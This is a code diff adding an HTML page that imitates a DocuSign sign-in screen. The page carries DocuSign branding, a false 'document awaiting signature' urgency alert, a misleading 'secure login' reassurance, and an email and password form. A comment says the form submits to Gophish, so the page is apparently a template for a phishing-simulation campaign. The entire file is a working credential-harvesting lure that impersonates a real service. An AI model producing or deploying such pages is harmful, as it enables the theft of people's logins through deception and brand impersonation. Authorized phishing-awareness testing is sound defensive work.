@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DocuSign - Sign in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo-text {
+            font-size: 32px;
+            font-weight: bold;
+            color: #003e51;
+        }
+
+        .logo-yellow {
+            color: #ffd100;
+        }
+
+        .card {
+            background: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 40px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: bold;
+            color: #000000;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 32px;
+        }
+
+        .alert {
+            background-color: #fff4e5;
+            border-left: 4px solid #ffc107;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+
+        .alert-text {
+            color: #856404;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: bold;
+            color: #000000;
+            margin-bottom: 6px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            background: #ffffff;
+            color: #000000;
+            transition: border-color 0.2s;
+        }
+
+        input:hover {
+            border-color: #999999;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #003e51;
+            box-shadow: 0 0 0 2px rgba(0,62,81,0.1);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 16px 0;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: auto;
+            margin-right: 8px;
+        }
+
+        .checkbox-group label {
+            margin: 0;
+            font-weight: normal;
+            font-size: 14px;
+        }
+
+        .button {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: #003e51;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .button:hover {
+            background-color: #002a36;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 16px;
+            color: #0073cf;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 32px 0;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background-color: #e0e0e0;
+        }
+
+        .divider span {
+            background-color: #ffffff;
+            padding: 0 16px;
+            position: relative;
+            font-size: 13px;
+            color: #666666;
+        }
+
+        .sso-button {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            background-color: #ffffff;
+            color: #000000;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s, border-color 0.2s;
+            margin-bottom: 12px;
+        }
+
+        .sso-button:hover {
+            background-color: #f4f4f4;
+            border-color: #999999;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+            color: #666666;
+        }
+
+        .footer a {
+            color: #0073cf;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .security-note {
+            background-color: #e8f5e9;
+            border-left: 4px solid #4caf50;
+            padding: 12px 16px;
+            margin-top: 20px;
+            border-radius: 4px;
+        }
+
+        .security-note-text {
+            color: #2e7d32;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <span class="logo-text">
+                <span class="logo-yellow">D</span>ocu<span class="logo-yellow">Sign</span>
+            </span>
+        </div>
+
+        <div class="card">
+            <h1>Sign In</h1>
+            <p class="subtitle">Access your documents securely</p>
+
+            <div class="alert">
+                <p class="alert-text">
+                    <strong>⏰ Document Awaiting Signature:</strong> You have 1 pending document that requires your immediate attention.
+                </p>
+            </div>
+
+            <form id="loginForm" method="POST">
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" name="email" placeholder="you@example.com" required autofocus>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Stay signed in</label>
+                </div>
+
+                <button type="submit" class="button">SIGN IN</button>
+
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </form>
+
+            <div class="divider">
+                <span>or sign in with</span>
+            </div>
+
+            <button class="sso-button">
+                <svg width="18" height="18" viewBox="0 0 18 18" style="vertical-align: middle; margin-right: 8px;">
+                    <path fill="#4285F4" d="M17.6 9.2c0-.6-.1-1.2-.2-1.8H9v3.4h4.8c-.2 1.1-.8 2-1.7 2.6v2.2h2.8c1.6-1.5 2.5-3.7 2.5-6.3z"/>
+                    <path fill="#34A853" d="M9 18c2.4 0 4.5-.8 6-2.2l-2.8-2.2c-.8.5-1.8.8-3.2.8-2.4 0-4.5-1.6-5.2-3.9H1v2.3C2.4 15.8 5.5 18 9 18z"/>
+                    <path fill="#FBBC04" d="M3.8 10.5c-.2-.5-.3-1.1-.3-1.7s.1-1.2.3-1.7V4.8H1C.4 6 0 7.4 0 9s.4 3 1 4.2l2.8-2.7z"/>
+                    <path fill="#EA4335" d="M9 3.6c1.4 0 2.6.5 3.6 1.4l2.6-2.6C13.5.9 11.4 0 9 0 5.5 0 2.4 2.2 1 5.2l2.8 2.3c.7-2.3 2.8-3.9 5.2-3.9z"/>
+                </svg>
+                Google
+            </button>
+
+            <button class="sso-button">
+                <svg width="18" height="18" viewBox="0 0 18 18" fill="#000" style="vertical-align: middle; margin-right: 8px;">
+                    <path d="M14.5 8.5c0-1.2.4-2.3 1.1-3.2-.9-1.3-2.3-2.1-3.9-2.2-1.7-.2-3.3.9-4.1.9-.9 0-2.2-.9-3.6-.9-1.9 0-3.6 1.1-4.5 2.7-2 3.4-.5 8.5 1.4 11.3 1 1.3 2.1 2.8 3.6 2.8 1.4-.1 2-.9 3.6-.9 1.7 0 2.1.9 3.6.9 1.5 0 2.6-1.4 3.6-2.7.7-.9 1.2-2 1.5-3.1-1.7-.7-2.8-2.4-2.8-4.3z"/>
+                </svg>
+                Apple
+            </button>
+
+            <div class="security-note">
+                <p class="security-note-text">
+                    🔒 <strong>Secure Login:</strong> Your connection is encrypted with 256-bit SSL. DocuSign will never ask for your password via email.
+                </p>
+            </div>
+        </div>
+
+        <div class="footer">
+            Don't have an account? <a href="#">Create account</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Let form submit naturally to Gophish
+        });
+    </script>
+</body>
+</html>
